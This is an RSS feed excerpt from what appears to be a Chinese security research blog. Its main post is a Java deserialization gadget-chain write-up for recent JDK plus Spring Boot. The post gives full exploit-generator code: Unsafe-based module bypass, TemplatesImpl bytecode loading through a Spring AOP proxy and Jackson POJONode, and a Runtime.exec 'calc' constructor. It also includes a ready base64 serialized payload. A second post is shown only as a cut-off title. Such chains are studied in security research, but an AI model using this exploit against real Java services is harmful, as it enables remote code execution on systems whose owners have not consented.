<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>N1ght</title>
    <link>https://www.n1ght.cn/</link>
    
    <atom:link href="https://www.n1ght.cn/atom.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Thu, 21 Aug 2025 08:50:06 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>高版本jdk+springboot链子</title>
      <link>https://www.n1ght.cn/2025/08/21/%E9%AB%98%E7%89%88%E6%9C%ACjdk+springboot%E9%93%BE%E5%AD%90/</link>
      <guid>https://www.n1ght.cn/2025/08/21/%E9%AB%98%E7%89%88%E6%9C%ACjdk+springboot%E9%93%BE%E5%AD%90/</guid>
      <pubDate>Thu, 21 Aug 2025 07:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;今天看到了师傅在群里发的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/yezere/images/master/image/01f258315b23969a24b44be6e74edb80-2025082021444</description>
        
      
      
      
      <content:encoded><![CDATA[<p>今天看到了师傅在群里发的</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/01f258315b23969a24b44be6e74edb80-20250820214448-9irvgud.png" alt="01f258315b23969a24b44be6e74edb80"></p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250820214503-a4zq8vn.png" alt="image"></p><p>获取序列化一眼看出来spring aop代理，加之前的一个trick，</p><p>不需要继承<code>AbstractTranslet</code>加载类</p><p>众里寻他千百度，慕然回首</p><p>为什么继承了<code>AbstractTranslet</code>不行呢</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250820214639-io6zn82.png" alt="image"></p><p>我们在这defineClass时候，触发了一个报错，检查包管理机制</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250820214749-n677r70.png" alt="image"></p><p>为什么，因为我们正常的类继承了<code>AbstractTranslet</code>​</p><p>所以在加载时候触发了包隔离，但是我们不需要继承也可以加载<code>AbstractTranslet</code>​</p><p>所以payload即是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n1ght;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.CtNewConstructor;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.CompoundEdit;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.bcel.internal=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.bcel.internal.classfile=ALL-UNNAMED</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Serial</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            (<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr)).writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> Base64.getEncoder().encodeToString(barr.toByteArray()).toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">base64DeSerial</span><span class="params">(String base64)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(base64);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bin);</span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fileSerial</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">            (<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr)).writeObject(o);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fileDeSerial</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deSerial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        base64DeSerial(base64Serial(o));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Unsafe unsafe;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射得到theUnsafe对应的Field对象</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            <span class="comment">// 设置该Field为可访问</span></span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 通过Field得到该Field对应的具体对象，传入null是因为该Field为static的</span></span><br><span class="line">            unsafe = (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 通过反射得到theUnsafe对应的Field对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置该Field为可访问</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 通过Field得到该Field对应的具体对象，传入null是因为该Field为static的</span></span><br><span class="line">        unsafe = (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setObject</span><span class="params">(Object o, Field field, Object value)</span> &#123;</span><br><span class="line">        unsafe.putObject(o, unsafe.objectFieldOffset(field), value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(Object o, Field field)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span>  unsafe.getObject(o, unsafe.objectFieldOffset(field));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newClass</span><span class="params">(Class c)</span> <span class="keyword">throws</span> InstantiationException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> unsafe.allocateInstance(c);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypassModule</span><span class="params">(Class src, Class dst)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(src, addr, unsafe.getObject(dst,unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>))));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getObjectBytes(Class o) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Repository.lookupClass(o).getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass3= pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass3.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass3.removeMethod(writeReplace);</span><br><span class="line">        ctClass3.toClass();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.addConstructor(</span><br><span class="line">                CtNewConstructor.make(<span class="string">&quot;public Calc() &#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>, ctClass)</span><br><span class="line">        );</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass1</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[] bytecode1 = ctClass1.toBytecode();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> newClass(aClass);</span><br><span class="line">        setObject(templates, aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>), <span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setObject(templates, aClass.getDeclaredField(<span class="string">&quot;_sdom&quot;</span>), <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">        setObject(templates, aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>), newClass(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>)));</span><br><span class="line"><span class="comment">//        setObject(templates, aClass.getDeclaredField(&quot;_bytecodes&quot;), new byte[][] &#123;bytecode, bytecode1&#125;);</span></span><br><span class="line">        setObject(templates, aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>), <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecode, bytecode1&#125;);</span><br><span class="line"><span class="comment">//        setObject(templates, aClass.getDeclaredField(&quot;_bytecodes&quot;), new byte[][] &#123;TomcatEcho.testCalc()&#125;);</span></span><br><span class="line">        Class&lt;?&gt; jdkDynamicAopProxy = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; advisedSupport = Class.forName(<span class="string">&quot;org.springframework.aop.framework.AdvisedSupport&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = jdkDynamicAopProxy.getConstructor(advisedSupport);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">advisedSupport1</span> <span class="operator">=</span> advisedSupport.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">setTarget</span> <span class="operator">=</span> advisedSupport1.getClass().getMethod(<span class="string">&quot;setTarget&quot;</span>, Object.class);</span><br><span class="line">        setTarget.invoke(advisedSupport1, templates);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(advisedSupport1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line">        </span><br><span class="line">        Class&lt;?&gt; name = Class.forName(<span class="string">&quot;com.fasterxml.jackson.databind.node.POJONode&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor1 = name.getConstructor(Object.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> constructor1.newInstance(proxy);</span><br><span class="line"><span class="comment">//        Object node = constructor1.newInstance(templates);</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = new JSONObject();</span></span><br><span class="line"><span class="comment">//        jsonObject.put(&quot;aaa&quot;,proxy);</span></span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getObject(manager, CompoundEdit.class.getDeclaredField(<span class="string">&quot;edits&quot;</span>));</span><br><span class="line">        vector.add(node);</span><br><span class="line"><span class="comment">//        vector.add(jsonObject);</span></span><br><span class="line">        setObject(list2, EventListenerList.class.getDeclaredField(<span class="string">&quot;listenerList&quot;</span>), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line"><span class="comment">//        proxy.toString();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> base64Serial(list2);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> base64DeSerial(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>没有触发</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250820215440-3gy1i9m.png" alt="image"></p><p>调用newInstance触发</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250820215518-ugu7tt1.png" alt="image"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String s= <span class="string">&quot;rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdJFIzC1z3w7eAwAAeHB0ABdqYXZhLmxhbmcuSW50ZXJuYWxFcnJvcnNyABxqYXZheC5zd2luZy51bmRvLlVuZG9NYW5hZ2Vy8X6fHQgqwh0CAAJJAA5pbmRleE9mTmV4dEFkZEkABWxpbWl0eHIAHWphdmF4LnN3aW5nLnVuZG8uQ29tcG91bmRFZGl0pZ5QulPblf0CAAJaAAppblByb2dyZXNzTAAFZWRpdHN0ABJMamF2YS91dGlsL1ZlY3Rvcjt4cgAlamF2YXguc3dpbmcudW5kby5BYnN0cmFjdFVuZG9hYmxlRWRpdAgNG47tAgsQAgACWgAFYWxpdmVaAAtoYXNCZWVuRG9uZXhwAQEBc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAGRzcgAsY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuUE9KT05vZGUAAAAAAAAAAgIAAUwABl92YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuSmRrRHluYW1pY0FvcFByb3h5TMS0cQ7rlvwCAAFMAAdhZHZpc2VkdAAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc2VkU3VwcG9ydDt4cHNyADBvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuQWR2aXNlZFN1cHBvcnQky4o8+qTFdQIABloAC3ByZUZpbHRlcmVkTAATYWR2aXNvckNoYWluRmFjdG9yeXQAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNvckNoYWluRmFjdG9yeTtMAAphZHZpc29yS2V5dAAQTGphdmEvdXRpbC9MaXN0O0wACGFkdmlzb3JzcQB+ABtMAAppbnRlcmZhY2VzcQB+ABtMAAx0YXJnZXRTb3VyY2V0ACZMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvVGFyZ2V0U291cmNlO3hyAC1vcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuUHJveHlDb25maWeLS/Pmp+D3bwIABVoAC2V4cG9zZVByb3h5WgAGZnJvemVuWgAGb3BhcXVlWgAIb3B0aW1pemVaABBwcm94eVRhcmdldENsYXNzeHAAAAAAAABzcgA8b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkRlZmF1bHRBZHZpc29yQ2hhaW5GYWN0b3J5A8nnSQWpqEwCAAB4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAic3EAfgAhAAAAAHcEAAAAAHhzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AudGFyZ2V0LlNpbmdsZXRvblRhcmdldFNvdXJjZX1VbvXH+Pq6AgABTAAGdGFyZ2V0cQB+AA54cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAASzK/rq+AAAANwAYAQAEQ2FsYwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAJQ2FsYy5qYXZhAQAGPGluaXQ+AQADKClWDAAHAAgKAAQACQEAEWphdmEvbGFuZy9SdW50aW1lBwALAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADQAOCgAMAA8BAARjYWxjCAARAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEwAUCgAMABUBAARDb2RlACEAAgAEAAAAAAABAAEABwAIAAEAFwAAABoAAgABAAAADiq3AAq4ABASErYAFlexAAAAAAABAAUAAAACAAZ1cQB+AC4AAACWyv66vgAAADcADAEAA0ZvbwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIRm9vLmphdmEBAAY8aW5pdD4BAAMoKVYMAAcACAoABAAJAQAEQ29kZQAhAAIABAAAAAAAAQABAAcACAABAAsAAAARAAEAAQAAAAUqtwAKsQAAAAAAAQAFAAAAAgAGcHQABW4xZ2h0cHcBAHhwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHB4AAAAAAAAAGRweA==&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(s))).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://www.n1ght.cn/2025/08/21/%E9%AB%98%E7%89%88%E6%9C%ACjdk+springboot%E9%93%BE%E5%AD%90/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>blackhat-JDD-hessian反序列化jdk_fastjson链</title>
      <link>https://www.n1ght.cn/2025/08/21/blackhat-JDD-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jdk_fastjson%E9%93%BE/</link>
      <guid>https://www.n1ght.cn/2025/08/21/blackhat-JDD-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jdk_fastjson%E9%93%BE/</guid>
      <pubDate>Thu, 21 Aug 2025 06:00:00 GMT</pubDate>
      
        
        
      <description>&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</description>
        
      
      
